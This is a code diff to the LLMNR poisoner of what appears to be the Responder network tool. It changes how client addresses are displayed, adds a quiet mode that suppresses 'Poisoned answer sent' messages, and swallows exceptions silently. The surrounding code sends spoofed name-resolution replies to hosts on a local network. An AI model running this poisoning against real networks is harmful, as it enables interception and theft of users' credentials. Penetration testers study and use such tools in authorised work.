@@ -37,7 +37,7 @@ def IsICMPRedirectPlausible(IP):
 		for line in file:
 			ip = line.split()
 			if len(ip) < 2:
-		   		continue
+				continue
 			elif ip[0] == 'nameserver':
 				dnsip.extend(ip[1:])
 		for x in dnsip:
@@ -58,13 +58,13 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 			LLMNRType = Parse_IPV6_Addr(data)
 
 			# Break out if we don't want to respond to this host
-			if RespondToThisHost(self.client_address[0], Name) is not True:
+			if RespondToThisHost(self.client_address[0].replace("::ffff:",""), Name) is not True:
 				return None
 			#IPv4
 			if data[2:4] == b'\x00\x00' and LLMNRType:
 				if settings.Config.AnalyzeMode:
 					LineHeader = "[Analyze mode: LLMNR]"
-					print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1))
+					print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
 					SavePoisonersToDb({
 							'Poisoner': 'LLMNR', 
 							'SentToIp': self.client_address[0], 
@@ -76,21 +76,23 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 					Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
 					Buffer1.calculate()
 					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
-					LineHeader = "[*] [LLMNR]"
-					print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1))
+					if not settings.Config.Quiet_Mode:
+						LineHeader = "[*] [LLMNR]"
+						print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
 					SavePoisonersToDb({
 							'Poisoner': 'LLMNR', 
 							'SentToIp': self.client_address[0], 
 							'ForName': Name,
 							'AnalyzeMode': '0',
 							})
-	
+
 				elif LLMNRType == 'IPv6':
 					Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
 					Buffer1.calculate()
 					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
-					LineHeader = "[*] [LLMNR]"
-					print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1))
+					if not settings.Config.Quiet_Mode:
+						LineHeader = "[*] [LLMNR]"
+						print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
 					SavePoisonersToDb({
 							'Poisoner': 'LLMNR6', 
 							'SentToIp': self.client_address[0], 
@@ -99,4 +101,4 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 							})
 
 		except:
-			raise
+			pass
